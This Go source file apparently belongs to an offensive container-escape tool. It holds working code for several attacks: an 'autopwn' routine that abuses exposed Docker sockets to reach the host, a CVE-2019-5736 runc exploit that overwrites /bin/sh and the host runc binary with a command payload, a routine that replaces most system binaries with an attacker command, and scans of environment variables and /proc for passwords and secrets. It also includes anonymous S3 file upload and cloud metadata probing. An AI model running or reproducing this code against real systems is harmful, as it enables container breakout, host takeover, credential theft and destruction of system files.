package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/credentials"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/s3/s3manager"
)

func scrapeGcpMetadata(host, port string) (string, error) {
	connStr := fmt.Sprintf("%s:%s", host, port)
	d := net.Dialer{Timeout: time.Second * 5}

	fmt.Println("[+] Attempting to connect to: ", connStr)
	conn, err := d.Dial("tcp", connStr)
	if err != nil {
		return "", err
	}
	fmt.Fprintf(conn, "GET / HTTP/1.0\r\n\r\n")
	var buf bytes.Buffer
	bytesWritten, err := io.Copy(&buf, conn)
	if err != nil {
		return "", err
	}
	fmt.Printf("[*] Bytes received from metadata: %d\n", bytesWritten)
	return buf.String(), nil
}

func testUploadOfS3(fileToPush, s3Bucket, s3Region string) {
	fmt.Printf("[+] Pushing %s to -> %s\n", fileToPush, s3Bucket)

	s, err := session.NewSession(&aws.Config{
		Region:      aws.String(s3Region),
		Credentials: credentials.AnonymousCredentials,
	})

	if err != nil {
		fmt.Println("[ERROR] ", err)
	}

	err = s3Push(s, fileToPush, s3Bucket)
	if err != nil {
		fmt.Println("[ERROR] ", err)
	}
}

func s3Push(s *session.Session, filename, s3Bucket string) error {
	uploader := s3manager.NewUploader(s)

	file, err := os.Open(filename)
	if err != nil {
		return fmt.Errorf("failed to open file %q, %v", filename, err)
	}

	result, err := uploader.Upload(&s3manager.UploadInput{
		Bucket: aws.String(s3Bucket),
		Key:    aws.String(filename),
		Body:   file,
	})
	if err != nil {
		return fmt.Errorf("failed to upload file, %v", err)
	}

	fmt.Println("[*] Data uploaded to:", *aws.String(result.Location))

	return nil
}

func getGcpMetada() {
	fmt.Println("[+] Attempting to get GCP Metadata")
}

func execDocker(dockerSockPath string) error {
	cmd := "./docker/docker -H unix://" + dockerSockPath + " run docker id"
	out, err := exec.Command("sh", "-c", cmd).Output()
	if err != nil {
		return err
	}
	if *verbosePtr {
		fmt.Printf("[*] Command Output: %s\n", string(out[:]))
	}
	exitCode = 1
	return nil
}

func autopwn() {
	fmt.Println("[+] Attempting to autopwn")
	sockets, _ := getValidSockets(*pathPtr)
	httpSockets := getHTTPEnabledSockets(sockets)
	dockerSocks := getDockerEnabledSockets(httpSockets)
	for _, element := range dockerSocks {
		err := autopwnDocker(element)
		if err != nil {
			fmt.Println("[ERROR] ", err)
		}
	}
}

func autopwnDocker(dockerSock string) error {
	fmt.Println("[+] Attempting to autopwn: ", dockerSock)

	_, err := os.Stat("docker/docker")
	fileUrl := "https://download.docker.com/linux/static/stable/x86_64/docker-18.09.2.tgz"
	if err != nil {
		if *verbosePtr {
			fmt.Println("[*] Getting Docker client...")
		}
		if err := downloadFile("docker-18.09.2.tgz", fileUrl); err != nil {
			return err
		}
	}

	file, err := os.Open("docker-18.09.2.tgz")
	if err != nil {
		return err
	}
	err = untar(".", file)
	if err != nil {
		return err
	}
	if *verbosePtr {
		fmt.Println("[*] Successfully got Docker client...")
	}
	fmt.Println("[+] Attempting to escape to host...")
	if *cicdPtr {
		if *verbosePtr {
			fmt.Println("[+] Attempting in CICD Mode")
		}
		err := execDocker(dockerSock)
		if err != nil {
			fmt.Println("[*] Failed to escape container")
			return err
		}
		fmt.Println("[!] Successfully escaped container")
	} else {
		fmt.Println("[+] Attempting in TTY Mode")
		err := dropToTTY(dockerSock)
		if err != nil {
			return err
		}
		fmt.Println("[*] Successfully exited TTY")
	}
	return nil
}

func huntDomainSockets() {
	fmt.Println("[+] Hunting Down UNIX Domain Sockets from:", *pathPtr)
	sockets, _ := getValidSockets(*pathPtr)
	for _, element := range sockets {
		fmt.Println("[!] Found Valid UNIX Domain Socket: ", element)
	}
}

func checkEnvVars() {
	fmt.Println("[+] Checking ENV Variables for secrets")
	var terms []string
	var err error
	if *wordlistPtr != "nil" {
		terms, err = getLinesFromFile(*wordlistPtr)
		if err != nil {
			panic(err)
		}
	} else {
		terms = append(terms, "secret", "password")
	}

	for _, envVar := range os.Environ() {
		if checkForJuicyDeets(envVar, terms) {
			fmt.Println("[!] Sensitive Keyword found in ENV: ", envVar)
			exitCode = 2
		}
	}

}

func checkProcEnviron() {
	fmt.Println("[+] Searching /proc/* for data")
	files, err := ioutil.ReadDir("/proc")
	if err != nil {
		fmt.Println("[ERROR], Could not access ProcFS")
		return
	}

	var terms []string
	if *wordlistPtr != "nil" {
		terms, err = getLinesFromFile(*wordlistPtr)
		if err != nil {
			panic(err)
		}
	} else {
		terms = append(terms, "secret", "password")
	}

	for _, file := range files {
		environFile := "/proc/" + file.Name() + "/environ"
		_, err := os.Stat(environFile)
		if err != nil {
			if *verbosePtr {
				fmt.Println("[ERROR] file does not exist-> ", environFile)
			}
		} else {
			cmd := "cat " + environFile
			output, err := execShellCmd(cmd)
			if err != nil {
				if *verbosePtr {
					fmt.Println("[ERROR] Could not query environ for-> ", environFile)
				}
			}
			if checkForJuicyDeets(output, terms) {
				fmt.Printf("[!] Sensitive keyword found in: %s -> '%s'\n", environFile, output)
				exitCode = 2
			}
		}
	}
}

func checkForJuicyDeets(data string, terms []string) bool {
	if *wordlistPtr != "nil" {
		for _, term := range terms {
			if strings.Contains(strings.ToLower(data), strings.ToLower(term)) {
				return true
			}
		}

	} else {
		if strings.Contains(strings.ToLower(data), "password") || strings.Contains(strings.ToLower(data), "secret") {
			return true
		}
		return false
	}
	return false
}

func execShellCmd2(command string, args ...string) error {
	cmd := exec.Command(command, args...)
	if *verbosePtr {
		fmt.Println("[*] Running command and waiting to finish")
	}
	err := cmd.Run()
	if err != nil {
		return err
	}
	return nil
}

func execShellCmd(cmd string) (string, error) {
	out, err := exec.Command("sh", "-c", cmd).Output()
	if err != nil {
		return "", err
	}
	return string(out[:]), nil
}

func performHttpGetRequest(url string) (int, error) {
	timeout := time.Duration(3 * time.Second)
	client := http.Client{
		Timeout: timeout,
	}
	resp, err := client.Get(url)
	if err != nil {
		return 0, err
	}

	defer resp.Body.Close()

	return resp.StatusCode, nil
}

func checkMetadataServices() {

	if *endpointList != "nil" {
		endpoints, err := getLinesFromFile(*endpointList)
		if err != nil {
			log.Fatal(err)
		}

		for _, endpoint := range endpoints {
			if queryEndpoint(endpoint) {
				exitCode = 1
			}
		}

	} else {
		if queryEndpoint("http://169.254.169.254/") {
			exitCode = 1
		}
		if queryEndpoint("http://kubernetes.default.svc/") {
			exitCode = 1
		}
	}
}

func runcPwn(command string) {
	//This code has been pretty much copy+pasted from the great work done by Nick Frichetten
	//https://github.com/Frichetten/CVE-2019-5736-PoC
	fmt.Println("[!] WARNING THIS OPTION IS NOT CICD FRIENDLY, THIS WILL PROBABLY BREAK THE CONTAINER RUNTIME BUT YOU MIGHT GET SHELLZ...")
	payload := fmt.Sprintf("#!/bin/bash \n %s", command)
	fmt.Println("[+] Attempting to exploit CVE-2019-5736 with command: ", command)
	fd, err := os.Create("/bin/sh")
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Fprintln(fd, "#!/proc/self/exe")
	err = fd.Close()
	if err != nil {
		fmt.Println(err)
		return
	}

	fmt.Println("[+] This process will exit IF an EXECVE is called in the Container or if the Container is manually stopped")

	var found int
	for found == 0 {
		pids, err := ioutil.ReadDir("/proc")
		if err != nil {
			fmt.Println(err)
			return
		}
		for _, f := range pids {
			fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
			fstring := string(fbytes)
			if strings.Contains(fstring, "runc") {
				found, err = strconv.Atoi(f.Name())
				if err != nil {
					fmt.Println(err)
					return
				}
			}
		}
	}
	var handleFd = -1
	for handleFd == -1 {
		handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe", os.O_RDONLY, 0777)
		if int(handle.Fd()) > 0 {
			handleFd = int(handle.Fd())
		}
	}
	for {
		writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
		if int(writeHandle.Fd()) > 0 {
			writeHandle.Write([]byte(payload))
			return
		}
	}
}

func getLinesFromFile(path string) ([]string, error) {
	fmt.Println("[*] Loading entries from:", path)
	var lines []string
	inFile, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer inFile.Close()
	scanner := bufio.NewScanner(inFile)
	scanner.Split(bufio.ScanLines)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, nil
}

func queryEndpoint(url string) bool {
	fmt.Printf("[*] Attempting to query metadata endpoint: '%s'\n", url)
	respCode, err := performHttpGetRequest(url)
	if err != nil {
		if *verbosePtr {
			fmt.Println("[ERROR]", err)
		}
	}
	if respCode > 0 {
		fmt.Printf("[!] Reponse from '%s' -> %d\n", url, respCode)
		return true
	}
	return false
}

func processCmdLine() {
	var found int
	for found == 0 {
		pids, err := ioutil.ReadDir("/proc")
		if err != nil {
			fmt.Println(err)
			return
		}
		for _, f := range pids {
			fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
			fstring := string(fbytes)
			if strings.Contains(fstring, "runc") {
				fmt.Println("[+] Found the PID:", f.Name())
				found, err = strconv.Atoi(f.Name())
				if err != nil {
					fmt.Println(err)
					return
				}
			}
		}
	}
}

func hijackBinaries(hijackCommand string) {

	fmt.Println("[!] WARNING THIS WILL PROBABLY BREAK THE CONTAINER BUT YOU MAY GET SHELLZ...")
	fmt.Println("[+] Attempting to hijack binaries")
	fmt.Println("[*] Command to be used: ", hijackCommand)
	command := fmt.Sprintf("#!/bin/sh \n %s \n", hijackCommand)

	hijackDirectory("/bin", command)
	hijackDirectory("/sbin", command)
	hijackDirectory("/usr/bin", command)
	hijackDirectory("/usr/sbin", command)
}

func copyFile(src, dst string) error {
	if *verbosePtr {
		fmt.Printf("[!] Copying %s -> %s\n", src, dst)
	}

	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	if err != nil {
		return err
	}
	return out.Close()
}

func createFile(filename, data string) error {
	if *verbosePtr {
		fmt.Println("[*] Creating file: ", filename)
	}
	f, err := os.Create(filename)
	if err != nil {
		fmt.Println(err)
		return err
	}
	l, err := f.WriteString(data)
	if err != nil {
		fmt.Println(err)
		f.Close()
		return err
	}
	if *verbosePtr {
		fmt.Println(l, "[*] Bytes written successfully")
	}

	err = f.Close()
	if err != nil {
		fmt.Println(err)
		return err
	}
	return nil
}

func hijackDirectory(dir, command string) {
	fmt.Println("[+] Currently hijacking: ", dir)
	files, err := ioutil.ReadDir(dir)
	if err != nil {
		log.Fatal(err)
	}
	if *verbosePtr {
		fmt.Printf("[*] Number of binaries identified: %d\n", len(files))
	}

	for _, file := range files {
		if strings.ToLower(file.Name()) == "busybox" || strings.ToLower(file.Name()) == "sh" || strings.ToLower(file.Name()) == "dash" ||
			strings.ToLower(file.Name()) == "ls" || strings.ToLower(file.Name()) == "echo" || strings.ToLower(file.Name()) == "chmod" ||
			strings.ToLower(file.Name()) == "bash" || strings.ToLower(file.Name()) == "cp" || strings.ToLower(file.Name()) == "compgen" ||
			strings.ToLower(file.Name()) == "rm" || strings.ToLower(file.Name()) == "mv" || strings.ToLower(file.Name()) == "which" ||
			strings.ToLower(file.Name()) == "curl" || strings.ToLower(file.Name()) == "chown" {
			if *verbosePtr {
				fmt.Println("[*] Skipping: ", file.Name())
			}
		} else {
			if *verbosePtr {
				fmt.Println("[*] Hijacking -> ", file.Name())
			}

			err := createFile(file.Name(), command)
			if err != nil {
				if *verbosePtr {
					fmt.Println("[*] Error creating tmp file->", err)
				}

			}

			err = execShellCmd2("rm", fmt.Sprintf("%s/%s", dir, file.Name()))
			if err != nil {
				if *verbosePtr {
					fmt.Println("[*] Error deleting binary file->", err)
				}

			}

			err = copyFile(file.Name(), fmt.Sprintf("%s/%s", dir, file.Name()))
			if err != nil {
				if *verbosePtr {
					fmt.Println("[*] Error copying file->", err)
				}

			}

			err = execShellCmd2("chmod", "+x", fmt.Sprintf("%s/%s", dir, file.Name()))
			if err != nil {
				if *verbosePtr {
					fmt.Println("[*] Error chmoding file->", err)
				}

			}
			err = execShellCmd2("rm", file.Name())
			if err != nil {
				if *verbosePtr {
					fmt.Println("[*] Error cleaning up->", err)
				}
			}
		}
	}
}

func huntNetworkInterfaces() {
	fmt.Println("[+] Attempting to get local network interfaces")

	err := processInterfaces()
	if err != nil {
		fmt.Println("[+] Error getting local interfaces, ", err)
	}
}

func getLocalInterfaces() ([]Interface, error) {

	interfaces, err := net.Interfaces()

	var interfaceResults []Interface

	if err != nil {
		fmt.Print(err)
		return nil, err
	}

	for _, i := range interfaces {
		byNameInterface, err := net.InterfaceByName(i.Name)
		var result Interface
		result.Name = i.Name
		if err != nil {
			fmt.Println(err)
			return nil, err
		}
		addresses, err := byNameInterface.Addrs()
		var addressResults []IpAddress
		for _, v := range addresses {
			var address IpAddress
			address.Address = v.String()
			addressResults = append(addressResults, address)
		}
		result.Addresses = addressResults
		interfaceResults = append(interfaceResults, result)
	}
	return interfaceResults, nil
}

func processInterfaces() error {
	var interfaceResults []Interface
	interfaces, err := net.Interfaces()
	if err != nil {
		return err
	}
	for _, i := range interfaces {
		byNameInterface, err := net.InterfaceByName(i.Name)
		if err != nil {
			return err
		}
		var result Interface
		result.Name = i.Name

		fmt.Println("[*] Got Interface: " + i.Name)
		if err != nil {
			return err
		}
		addresses, err := byNameInterface.Addrs()
		if err != nil {
			return err
		}
		var addressResults []IpAddress
		for _, v := range addresses {
			fmt.Println("\t[*] Got address: " + v.String())
			var address IpAddress
			address.Address = v.String()
			addressResults = append(addressResults, address)
		}
		result.Addresses = addressResults
		interfaceResults = append(interfaceResults, result)
	}
	return nil
}

func findHttpSockets() {
	fmt.Println("[+] Looking for HTTP enabled Sockets")
	// dockerdVal, checkResult := checkForDockerEnvSock()
	// if checkResult {
	// 	fmt.Println("[!] Dockerd DOCKER_HOST found:", dockerdVal)
	// }
	sockets, _ := getValidSockets(*pathPtr)
	httpSockets := getHTTPEnabledSockets(sockets)
	// dockerSocks := getDockerEnabledSockets(httpSockets)
	for _, aSock := range httpSockets {
		fmt.Println("[!] Valid HTTP Socket:", aSock)
	}
}

func findDockerD() {
	fmt.Println("[+] Looking for Dockerd")
	dockerdVal, checkResult := checkForDockerEnvSock()
	if checkResult {
		fmt.Println("[!] Dockerd DOCKER_HOST found:", dockerdVal)
	}
	sockets, _ := getValidSockets(*pathPtr)
	httpSockets := getHTTPEnabledSockets(sockets)
	dockerSocks := getDockerEnabledSockets(httpSockets)
	for _, aSock := range dockerSocks {
		fmt.Println("[!] Valid Docker Socket:", aSock)
	}
}

func checkForDockerEnvSock() (string, bool) {
	for _, envVar := range os.Environ() {
		if strings.Contains(strings.ToUpper(envVar), "DOCKER_HOST") {
			return envVar[strings.Index(envVar, "=")+1:], true
		}
	}
	return "", false
}
